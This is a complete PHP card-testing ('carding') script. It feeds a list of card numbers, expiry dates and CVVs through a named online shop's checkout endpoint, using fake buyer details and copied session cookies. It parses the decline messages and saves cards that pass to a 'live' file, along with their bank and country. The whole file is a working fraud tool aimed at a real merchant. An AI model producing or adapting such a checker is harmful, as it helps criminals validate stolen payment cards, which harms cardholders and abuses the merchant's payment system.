<?php
/*
Created at 10/10/19
Fixed at 22/08/20
AVS Card Checker
Made with <3 by Nicsx
*/

/* Spawn Date and Time */
$date = date("d-m-Y");
/* End Spawn */

function banner(){
  echo "AVS Checker v1.3 #Romeo\n";
  echo "  Coded by Nicsx  \n";
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

function checkBin($bin){
  $getbank = 'https://lookup.binlist.net/'.$bin;
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $getbank);
    curl_setopt($c, CURLOPT_HEADER, 0);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);  
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12");
    $rzlt=curl_exec($c);
    curl_close($c);
    $detailsbank = json_decode($rzlt);
    $ccbrand = strtoupper($detailsbank->scheme);
    $ccbank  = $detailsbank->bank->name;
    $cctype  = strtoupper($detailsbank->type);
    $ccnegara = strtoupper($detailsbank->country->name);
    return $bin." | ".$ccbrand." - ".$cctype." - ".$ccbank." - ".$ccnegara;
}

function randStr($length = 4) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$file = file_get_contents("list.txt");
banner();
foreach (explode(PHP_EOL, $file) as $kA => $a) {

  /* Get Billing */
  $firstname = "Muj".randStr();
  $lastname = "Naj".randStr();
  $address1 = "301 Jackpot Rd";
  $address2 = "No 17";
  $city = "Hawthorne";
  $state = "CA";
  $postal = "90250";
  $phone = "4127364816";
  /* End Get Billing */

  /* Get Card */
  $cardholder = "Muj".randStr()." Naj".randStr();
  $cardnumber = multiexplode(array(PHP_EOL,"|",":"),$a)[0];
  $expmonth = multiexplode(array(PHP_EOL,"|",":"),$a)[1];
  $expyear = multiexplode(array(PHP_EOL,"|",":"),$a)[2];
  $cvv = multiexplode(array(PHP_EOL,"|",":"),$a)[3];
  $digit = substr(multiexplode(array(PHP_EOL,"|",":"),$a)[0], -4);
  /* End Get Card */

  // The data to send to the API
  $postData = array(
    "billingAddress" => array (
      "city" => $city,
      "company" => "",
      "country" => "US",
      "customerId" => 0,
      "firstName" => $firstname,
      "id" => 0,
      "lastName" => $lastname,
      "line1" => $address1,
      "line2" => $address2,
      "phone" => $phone,
      "postalCode" => $postal,
      "state" => $state,
      "title" => null,
      "externalId" => null,
      "province" => "",
      "usState" => $state
    ),
    "cartId" => 12090,
    "channel" => null,
    "comment" => null,
    "couponCode" => null,
    "completedDate" => null,
    "customerId" => null,
    "confirmPassword" => randStr()."1337",
    "customerUserId" => null,
    "backorderCancelDate" => "",
    "desiredShippingDate" => "",
    "discountAmount" => 0,
    "email" => "res".randStr()."ultni".randStr().".qo@gmail.com",
    "okToEmail" => false,
    "grandTotal" => 0,
    "id" => 0,
    "items" => null,
    "itemsAmount" => 53,
    "notEnoughInventoryWarning" => false,
    "orderCode" => null,
    "payment" => array (
      "creditCardCode" => $cvv,
      "ignoreCardCodeValidation" => false,
      "creditCardExpirationMonth" => $expmonth,
      "creditCardExpirationYear" => $expyear,
      "creditCardName" => $cardholder,
      "creditCardNumber" => $cardnumber,
      "paymentMethod" => "CreditCard",
      "paymentTermId" => 1,
      "poNumber" => "",
      "creditLastFour" => $digit
    ),
    "password" => "root1337",
    "shipments" => [],
    "sameAsShipping" => false,
    "shippingAddress" => array (
      "city" => "Minnetonka",
      "company" => "",
      "country" => "US",
      "customerId" => 0,
      "firstName" => "Nico",
      "id" => 0,
      "lastName" => "Smith",
      "line1" => $address1,
      "line2" => $address2,
      "phone" => $phone,
      "postalCode" => $postal,
      "state" => $state,
      "title" => null,
      "externalId" => null,
      "province" => "",
      "usState" => $state
    ),
    "shippingAmount" => 0,
    "shippingRateId" => "1",
    "shippingTrackingNumber" => null,
    "shippingCarrier" => "Undefined",
    "shippingDate" => null,
    "siteId" => 0,
    "siteName" => null,
    "taxAmount" => 0,
    "zip2TaxId" => null
  );

  // Setup cURL
  $ch = curl_init('https://www.3dbelt.com/Checkout/PlaceOrder');
  curl_setopt_array($ch, array(
      CURLOPT_POST => TRUE,
      CURLOPT_RETURNTRANSFER => TRUE,
      CURLOPT_HTTPHEADER => array(
          'Content-Type: application/json',
          'Cookie: _ga=GA1.2.989559124.1599359612; _gid=GA1.2.574434195.1599359612; _fbp=fb.1.1599359612802.1085158135; _pin_unauth=dWlkPU9EUTBNekEyT1dJdE9EbGlOeTAwWVRCbUxUbGhNell0WmpJd01qZ3dOakF4WlRGaSZycD1abUZzYzJV; ASP.NET_SessionId=2iids0orbnftxjyui4sa340n; __RequestVerificationToken=an7caPxwkO7VWRHbNesNylU8oagEroz9GLoBa3Nw-xW_pgxZo4yZSm3RgMi3Zavx8l52sO25gpxFdqXchme9LayY5oA49tfL4bdExFfIN_I1; __atuvc=1%7C37; __atuvs=5f544aad6a06bede000; last-catalog-page=/c701_kids?SortDirection=Asc&SortBy=Price&PageSize=15; Singularity.3d.Cart=12062',
          'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
          'referer: https://www.3dbelt.com/Checkout?guest=True'
      ),
      CURLOPT_POSTFIELDS => json_encode($postData)
  ));
  $response = curl_exec($ch);
  curl_close($ch);
  $debug = json_decode($response, true);
  $hasil = $debug['message'];
  $bin = substr($cardnumber, 0, 6);
  $num = 1;
  $tunggu = "======[ Sleep 5 Detik ]======\n"; sleep(5);
   if ($hasil == "Card authorization failed. This transaction has been declined.") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Card Declined\n";
      echo $tunggu;
   } elseif ($hasil == "Card authorization failed. The card code is invalid.") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Invalid CVV\n";
      echo $tunggu;
   } elseif ($hasil == "Card authorization failed. The credit card number is invalid.") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Invalid Card Number\n";
      echo $tunggu;
   } elseif ($hasil == "Card authorization failed. Credit card expiration date is invalid.") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Invalid Expired Date\n";
      echo $tunggu;
   } elseif ($hasil == "Card authorization failed. Your order has been received. Thank you for your business!") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Merchant Error\n";
      echo $tunggu;
   } elseif ($hasil == "Card authorization failed. The credit card has expired.") {
      echo "[".($kA + 1)."/".count(file('list.txt'))."] DIE => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: Card Expired\n";
      echo $tunggu;
   } else {
//print_r($debug);
      echo "[".($kA + 1)."/".count(file('list.txt'))."] APPROVED => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: AVS Mismatch [BIN/IIN: ".checkBin($bin)."]\n";
      $gans = "APPROVED => ".$cardnumber."|".$expmonth."|".$expyear."|".$cvv." - Reason: AVS Mismatch [BIN/IIN: ".checkBin($bin)."]";
      file_put_contents("live-".$date.".txt", $gans.PHP_EOL, FILE_APPEND);
      echo $tunggu;
   }
 
 }